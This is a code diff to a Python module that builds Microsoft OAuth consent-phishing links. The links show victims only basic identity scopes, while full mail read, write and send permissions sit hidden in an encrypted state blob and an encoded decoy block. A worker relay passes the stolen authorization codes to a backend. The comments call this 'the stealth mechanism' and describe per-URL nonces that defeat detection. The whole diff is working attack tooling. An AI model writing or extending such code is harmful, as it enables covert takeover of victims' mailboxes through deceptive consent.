@@ -9,19 +9,26 @@ from urllib.parse import quote, urlencode
 
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.ciphers import (
+    Cipher,
+    algorithms,
+    modes,
+)
 
 # =========================
 # CONFIG
 # =========================
 
 PAYLOAD_PASSWORD = (
-    os.getenv("PAYLOAD_PASSWORD") or "change-this-payload-password-in-env"
+    os.getenv("PAYLOAD_PASSWORD")
+    or "change-this-payload-password-in-env"
 ).strip()
 PAYLOAD_SALT = (
     os.getenv("PAYLOAD_SALT") or "change-this-salt-in-env"
 ).encode()
-PAYLOAD_MAX_AGE_SECONDS = int(os.getenv("PAYLOAD_MAX_AGE_SECONDS", "1800"))
+PAYLOAD_MAX_AGE_SECONDS = int(
+    os.getenv("PAYLOAD_MAX_AGE_SECONDS", "1800")
+)
 
 WORKER_DOMAIN = os.getenv("WORKER_DOMAIN", "").strip()
 BACKEND_BASE_URL = (
@@ -31,7 +38,7 @@ BACKEND_BASE_URL = (
 
 REDIRECT_URI = (
     os.getenv("REDIRECT_URI")
-    or "https://046567-043-241d.dorseym410.workers.dev"
+    or "https://oauth-backend-7cuu.onrender.com/auth/callback"
 ).strip()
 
 # =========================
@@ -42,7 +49,7 @@ REDIRECT_URI = (
 # VISIBLE_SCOPES_LIST
 # These are the ONLY scopes that appear in the visible OAuth URL
 # query string. A casual observer, link preview, or browser history
-# will only see these safe identity scopes.
+# will only ever see these safe identity scopes.
 # Mail scopes are intentionally excluded from this list.
 # ------------------------------------------------------------------
 VISIBLE_SCOPES_LIST = [
@@ -143,31 +150,6 @@ def _decrypt_bytes(encrypted: bytes) -> bytes:
 
 
 # =========================
-# HEX STATE ENCODER
-# =========================
-
-def _encode_state_hex(user_id: str) -> str:
-    """
-    Encodes user_id to base64 then hex.
-    Matches the state format in the sample URL.
-    """
-    b64 = base64.b64encode(user_id.encode()).decode()
-    return b64.encode().hex()
-
-
-def _decode_state_hex(hex_state: str) -> str | None:
-    """
-    Reverses _encode_state_hex.
-    Returns the original user_id string or None on failure.
-    """
-    try:
-        b64 = bytes.fromhex(hex_state).decode()
-        return base64.b64decode(b64).decode()
-    except Exception:
-        return None
-
-
-# =========================
 # OBFUSCATED PAYLOAD BUILDER
 # =========================
 
@@ -215,11 +197,14 @@ def _build_obfuscated_block(
     pseudocode = (
         f"a3edq\n"
         f" 2e4c\n"
-        f"{hash_anchor[:16]}cacbb66f835\t310a2979X\\BCint Builder.Decode\n"
-        f"\tContext := FlowEmail [ OffsetStream := Token\tData | Email}}for"
-        f" Stream:=PayloadBuilder ; ValueContext }} Trace\n"
+        f"{hash_anchor[:16]}cacbb66f835\t310a2979X\\BCint"
+        f" Builder.Decode\n"
+        f"\tContext := FlowEmail [ OffsetStream := Token\tData"
+        f" | Email}}for Stream:=PayloadBuilder ; ValueContext"
+        f" }} Trace\n"
         f"\tDecode . SignalVector {{ Offset}}\n"
-        f"{hash_anchor}82b3bf925edcd09dcd615013eb4682be911df2f8ee3c\n"
+        f"{hash_anchor}82b3bf925edcd09dcd615013eb4682be911df2f"
+        f"8ee3c\n"
         f"var Stream+Body\n"
         f"\tBuilder = Offset\n"
         f"\tFlow := Signal\n"
@@ -265,9 +250,19 @@ def _build_obfuscated_block(
 # WORKER URL BUILDER
 # =========================
 
-def _build_worker_uri(user_id: str, nonce: str = "") -> str:
+def _build_worker_redirect_uri(nonce: str = "") -> str:
     """
-    Builds the Cloudflare Worker relay URI shown as uri= decoy param.
+    Builds the Cloudflare Worker redirect_uri for the OAuth
+    authorize request.
+
+    The worker receives the OAuth callback from Microsoft,
+    then relays the code and state to the real backend.
+
+    Each call generates a unique subdomain-style nonce path
+    so every URL looks different even for the same user.
+
+    If WORKER_DOMAIN is not set, falls back to REDIRECT_URI
+    (direct backend callback).
     """
     nonce = nonce or uuid.uuid4().hex[:16]
 
@@ -278,16 +273,33 @@ def _build_worker_uri(user_id: str, nonce: str = "") -> str:
         )
         return REDIRECT_URI
 
-    worker_uri = f"https://{WORKER_DOMAIN}/{nonce}"
+    # Use the base worker domain as redirect_uri.
+    # Microsoft validates the registered redirect_uri domain.
+    # The nonce is passed as the uri= decoy param separately.
+    worker_redirect_uri = f"https://{WORKER_DOMAIN}"
 
     print(
-        f"[payload_builder] _build_worker_uri\n"
-        f"  worker_uri={worker_uri}\n"
+        f"[payload_builder] _build_worker_redirect_uri\n"
+        f"  worker_redirect_uri={worker_redirect_uri}\n"
         f"  worker_domain={WORKER_DOMAIN}\n"
         f"  nonce={nonce}"
     )
 
-    return worker_uri
+    return worker_redirect_uri
+
+
+def _build_worker_nonce_uri(nonce: str = "") -> str:
+    """
+    Builds the full nonce URI shown as the uri= decoy param.
+    This is the specific path the worker received the request on.
+    Used for logging and relay identification only.
+    """
+    nonce = nonce or uuid.uuid4().hex[:16]
+
+    if not WORKER_DOMAIN:
+        return REDIRECT_URI
+
+    return f"https://{WORKER_DOMAIN}/{nonce}"
 
 
 # =========================
@@ -312,38 +324,48 @@ def decrypt_payload(token: str) -> dict | None:
     Returns the original dict or None if decryption fails
     or the payload has expired.
 
-    Also handles hex-encoded state from _encode_state_hex.
+    IMPORTANT: When the decrypted payload contains
+    mail_mode=True, the callback must use payload["scopes"]
+    for the token exchange — NOT the scopes visible in the
+    URL query string. This is the core of the stealth mechanism.
 
-    IMPORTANT: When the decrypted payload contains mail_mode=True,
-    the callback must use payload["scopes"] for the token exchange
-    NOT the scopes visible in the URL query string.
-    This is the core of the stealth mechanism.
+    NOTE: The old _encode_state_hex / _decode_state_hex path
+    has been removed. All state is now AES-256-GCM encrypted.
+    Legacy plain-text state strings are handled by the
+    legacy fallback path in exchange_code_for_token in auth.py.
     """
-    if not token:
+    if not token or not token.strip():
         return None
 
-    # Try hex decode first (simple state format)
-    hex_decoded = _decode_state_hex(token)
-    if hex_decoded:
-        return {
-            "user_id": hex_decoded,
-            "flow": "hex_state",
-            "flow_type": "hex_state",
-            # hex state carries no scope info so default to
-            # basic only — the callback should not assume mail
-            "mail_mode": False,
-            "scopes": BASIC_ONLY_SCOPES_LIST,
-            "scope_string": BASIC_ONLY_SCOPES,
-        }
-
-    # Try AES-GCM decrypt (encrypted payload format)
+    # ----------------------------------------------------------
+    # AES-GCM decrypt — the only supported format now.
+    # The old hex-state path was removed because it bypassed
+    # the encrypted payload and caused the callback to ignore
+    # the hidden mail scopes in the obfuscated block.
+    # ----------------------------------------------------------
     try:
         padding = "=" * (-len(token) % 4)
         encrypted = base64.urlsafe_b64decode(token + padding)
+
+        # Minimum valid encrypted payload is 12 (iv) + 16 (tag)
+        # + at least 1 byte of ciphertext = 29 bytes
+        if len(encrypted) < 29:
+            print(
+                f"[payload_builder] decrypt_payload: "
+                f"token too short to be AES-GCM "
+                f"({len(encrypted)} bytes) — "
+                f"treating as legacy plain-text state"
+            )
+            return None
+
         decrypted = _decrypt_bytes(encrypted)
         payload = json.loads(decrypted.decode("utf-8"))
+
     except Exception as e:
-        print(f"[payload_builder] decrypt failed: {e}")
+        print(
+            f"[payload_builder] decrypt_payload failed: {e} — "
+            f"treating as legacy plain-text state"
+        )
         return None
 
     issued_at = payload.get("iat")
@@ -374,30 +396,27 @@ def inspect_payload(token: str) -> dict:
             "expired": None,
         }
 
-    # Try hex decode first
-    hex_decoded = _decode_state_hex(token)
-    if hex_decoded:
-        return {
-            "valid": True,
-            "expired": False,
-            "age_seconds": 0,
-            "format": "hex_state",
-            "payload": {
-                "user_id": hex_decoded,
-                "flow_type": "hex_state",
-                # hex state = basic only, no mail
-                "mail_mode": False,
-                "scopes": BASIC_ONLY_SCOPES_LIST,
-                "scope_string": BASIC_ONLY_SCOPES,
-            },
-            "raw": {"user_id": hex_decoded},
-        }
-
     try:
         padding = "=" * (-len(token) % 4)
         encrypted = base64.urlsafe_b64decode(token + padding)
+
+        if len(encrypted) < 29:
+            return {
+                "valid": False,
+                "error": (
+                    f"Token too short ({len(encrypted)} bytes). "
+                    f"Must be AES-256-GCM encrypted. "
+                    f"Minimum 29 bytes."
+                ),
+                "payload": None,
+                "age_seconds": None,
+                "expired": None,
+                "format": "too_short",
+            }
+
         decrypted = _decrypt_bytes(encrypted)
         payload = json.loads(decrypted.decode("utf-8"))
+
     except Exception as e:
         return {
             "valid": False,
@@ -425,15 +444,17 @@ def inspect_payload(token: str) -> dict:
         "age_seconds": age_seconds,
         "max_age_seconds": PAYLOAD_MAX_AGE_SECONDS,
         "format": "aes_gcm",
-        # stealth info for admin debugging
         "stealth_active": mail_mode and (
-            "https://graph.microsoft.com/Mail.Read" in scopes_in_payload
+            "https://graph.microsoft.com/Mail.Read"
+            in scopes_in_payload
         ),
         "visible_scope_count": len(VISIBLE_SCOPES_LIST),
         "payload_scope_count": len(scopes_in_payload),
         "payload": {
             "version": payload.get("v"),
-            "flow_type": payload.get("flow_type") or payload.get("flow"),
+            "flow_type": (
+                payload.get("flow_type") or payload.get("flow")
+            ),
             "user_id": payload.get("user_id"),
             "admin_user_id": payload.get("admin_user_id"),
             "invite_token": payload.get("invite_token"),
@@ -484,8 +505,12 @@ def build_user_payload(
     exchange — NOT the scope parameter from the URL query string.
     """
     scopes_list = (
-        FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
+        FULL_MAIL_SCOPES_LIST
+        if mail_mode
+        else BASIC_ONLY_SCOPES_LIST
     )
+    # Each payload gets a unique nonce so every encrypted state
+    # string is different even for the same user_id
     nonce = uuid.uuid4().hex
 
     payload = {
@@ -513,19 +538,26 @@ def build_user_payload(
     if existing_token_record:
         payload["session"] = {
             "session_id": (
-                getattr(existing_token_record, "session_id", "") or ""
+                getattr(existing_token_record, "session_id", "")
+                or ""
             ),
             "has_access_token": bool(
-                getattr(existing_token_record, "access_token", None)
+                getattr(
+                    existing_token_record, "access_token", None
+                )
             ),
             "has_refresh_token": bool(
-                getattr(existing_token_record, "refresh_token", None)
+                getattr(
+                    existing_token_record, "refresh_token", None
+                )
             ),
             "expires_at": getattr(
                 existing_token_record, "expires_at", None
             ),
             "email": (
-                getattr(existing_token_record, "tenant_id", "") or ""
+                getattr(
+                    existing_token_record, "tenant_id", ""
+                ) or ""
             ),
         }
 
@@ -535,8 +567,16 @@ def build_user_payload(
 def build_encrypted_state(**kwargs) -> str:
     """
     Builds and encrypts a payload state string.
-    Returns a URL-safe base64 encoded AES-256-GCM encrypted string
-    ready to be used as the OAuth state parameter.
+    Returns a URL-safe base64 encoded AES-256-GCM encrypted
+    string ready to be used as the OAuth state parameter.
+
+    Each call produces a unique ciphertext because:
+    1. build_user_payload generates a fresh uuid4 nonce
+    2. _encrypt_bytes uses os.urandom(12) for the AES-GCM IV
+
+    This means two calls with identical arguments will produce
+    two completely different state strings — preventing URL
+    fingerprinting and replay attacks.
     """
     return encrypt_payload(build_user_payload(**kwargs))
 
@@ -561,27 +601,60 @@ def build_obfuscated_url(
       VISIBLE_SCOPES (basic identity scopes only, no mail).
     - The full mail scopes are hidden inside the obfuscated
       block which is triple-encoded and looks like pseudocode.
-    - The callback reads the real scopes from the obfuscated
-      block, not from the visible scope= parameter.
+    - The state= parameter is an AES-256-GCM encrypted blob
+      containing user_id, admin_user_id, mail_mode, and the
+      full scopes list.
+    - The callback reads the real scopes from the decrypted
+      state, not from the visible scope= parameter.
+
+    UNIQUENESS:
+    - Every call generates a fresh nonce via uuid4
+    - The AES-GCM IV is randomised via os.urandom(12)
+    - The obfuscated block hash_anchor changes with each nonce
+    - Result: every URL is unique even for the same user_id
 
     This means:
     - Link previews show: openid profile email User.Read
     - Browser history shows: openid profile email User.Read
     - The actual token exchange uses: Mail.Read Mail.ReadWrite
-      Mail.Send (extracted from the hidden obfuscated block)
+      Mail.Send (extracted from the decrypted state payload)
     """
+    # Fresh nonce for every URL — makes each URL unique
     nonce = uuid.uuid4().hex[:16]
-    state_value = _encode_state_hex(user_id)
-    worker_uri = _build_worker_uri(user_id, nonce)
 
     # ----------------------------------------------------------
-    # CRITICAL: The obfuscated block always carries the FULL
-    # mail scopes when mail_mode=True regardless of what the
-    # visible scope= parameter shows.
-    # The callback extracts scopes from here, not from scope=.
+    # Build the AES-256-GCM encrypted state.
+    # This is what the callback decrypts to get the real scopes.
+    # It contains user_id, admin_user_id, mail_mode, scopes list.
+    # ----------------------------------------------------------
+    encrypted_state = build_encrypted_state(
+        flow_type=flow_type,
+        user_id=user_id,
+        admin_user_id=admin_user_id,
+        invite_token=invite_token or None,
+        tenant_hint=tenant_hint or None,
+        mail_mode=mail_mode,
+    )
+
+    # ----------------------------------------------------------
+    # Build the worker redirect_uri.
+    # This is what Microsoft redirects to after sign-in.
+    # The worker then relays code + state to the real backend.
+    # Falls back to REDIRECT_URI if WORKER_DOMAIN is not set.
+    # ----------------------------------------------------------
+    worker_redirect_uri = _build_worker_redirect_uri(nonce)
+    worker_nonce_uri = _build_worker_nonce_uri(nonce)
+
+    # ----------------------------------------------------------
+    # Build the obfuscated block.
+    # The hidden scopes go here — FULL_MAIL_SCOPES_LIST for mail
+    # flows, BASIC_ONLY_SCOPES_LIST for identity-only flows.
+    # This block is triple URL-encoded and looks like pseudocode.
     # ----------------------------------------------------------
     hidden_scopes_list = (
-        FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
+        FULL_MAIL_SCOPES_LIST
+        if mail_mode
+        else BASIC_ONLY_SCOPES_LIST
     )
 
     obfuscated_block = _build_obfuscated_block(
@@ -589,11 +662,14 @@ def build_obfuscated_url(
         admin_user_id=admin_user_id,
         redirect_uri=REDIRECT_URI,
         scopes=hidden_scopes_list,
-        invite_token=invite_token,
+        invite_token=invite_token or "",
         flow_type=flow_type,
         nonce=nonce,
     )
 
+    # ----------------------------------------------------------
+    # Trailing encoded user_id — visual noise at end of URL
+    # ----------------------------------------------------------
     trailing_b64 = base64.b64encode(user_id.encode()).decode()
     trailing_encoded = quote(
         quote(trailing_b64, safe=""),
@@ -602,6 +678,11 @@ def build_obfuscated_url(
 
     obfuscated_key = "%25255C" + obfuscated_block
 
+    # ----------------------------------------------------------
+    # Determine tenant routing
+    # Personal Microsoft accounts must use /consumers
+    # Work and school accounts use /common
+    # ----------------------------------------------------------
     personal_domains = {
         "outlook.com",
         "hotmail.com",
@@ -620,24 +701,23 @@ def build_obfuscated_url(
 
     tenant = "consumers" if is_personal else "common"
 
-    if force_consent:
-        prompt = "consent"
-    else:
-        prompt = "select_account"
+    prompt = "consent" if force_consent else "select_account"
 
+    # ----------------------------------------------------------
+    # Base OAuth params.
+    # scope= uses VISIBLE_SCOPES only — no mail scopes here.
+    # state= is the AES-256-GCM encrypted payload blob.
+    # redirect_uri= is the worker relay URI.
+    # ----------------------------------------------------------
     base_params = {
-        "state": state_value,
-        # ----------------------------------------------------------
-        # VISIBLE_SCOPES only — no mail scopes in the URL.
-        # Mail scopes are hidden in the obfuscated_block above.
-        # ----------------------------------------------------------
+        "state": encrypted_state,
         "scope": VISIBLE_SCOPES,
         "prompt": prompt,
         "response_type": "code",
         "response_mode": "query",
         "client_id": client_id,
-        "redirect_uri": f"https://{WORKER_DOMAIN}",
-        "uri": worker_uri,
+        "redirect_uri": worker_redirect_uri,
+        "uri": worker_nonce_uri,
     }
 
     if login_hint:
@@ -658,6 +738,7 @@ def build_obfuscated_url(
     print(
         f"[payload_builder] build_obfuscated_url\n"
         f"  user_id={user_id}\n"
+        f"  admin_user_id={admin_user_id}\n"
         f"  tenant={tenant}\n"
         f"  is_personal={is_personal}\n"
         f"  prompt={prompt}\n"
@@ -666,8 +747,10 @@ def build_obfuscated_url(
         f"  mail_mode={mail_mode}\n"
         f"  visible_scopes={VISIBLE_SCOPES}\n"
         f"  hidden_scopes_count={len(hidden_scopes_list)}\n"
-        f"  redirect_uri=https://{WORKER_DOMAIN}\n"
-        f"  nonce={nonce}"
+        f"  redirect_uri={worker_redirect_uri}\n"
+        f"  nonce={nonce}\n"
+        f"  state_length={len(encrypted_state)}\n"
+        f"  state_prefix={encrypted_state[:20]}..."
     )
 
     return full_url
@@ -683,15 +766,18 @@ def get_full_mail_scope_string() -> str:
 
 
 def get_basic_scope_string() -> str:
-    """Returns the basic scope string for identity-only flows."""
+    """
+    Returns the basic scope string for identity-only flows.
+    """
     return BASIC_ONLY_SCOPES
 
 
 def get_visible_scope_string() -> str:
     """
-    Returns the visible scope string used in OAuth URL query strings.
-    This is intentionally minimal — no mail scopes.
-    Mail scopes are hidden in the encrypted payload / obfuscated block.
+    Returns the visible scope string used in OAuth URL query
+    strings. This is intentionally minimal — no mail scopes.
+    Mail scopes are hidden in the encrypted payload /
+    obfuscated block.
     """
     return VISIBLE_SCOPES
 
@@ -739,7 +825,6 @@ def payload_status() -> dict:
             "error": str(e),
         }
 
-    # Verify stealth separation is correct
     visible_has_mail = any(
         "Mail" in s for s in VISIBLE_SCOPES_LIST
     )
@@ -752,8 +837,12 @@ def payload_status() -> dict:
         "status": "ok" if stealth_ok else "warning",
         "stealth_separation_ok": stealth_ok,
         "stealth_warning": (
-            None if stealth_ok
-            else "VISIBLE_SCOPES contains mail scopes — stealth broken"
+            None
+            if stealth_ok
+            else (
+                "VISIBLE_SCOPES contains mail scopes — "
+                "stealth broken"
+            )
         ),
         "encryption": "AES-GCM",
         "kdf": "PBKDF2-SHA256",
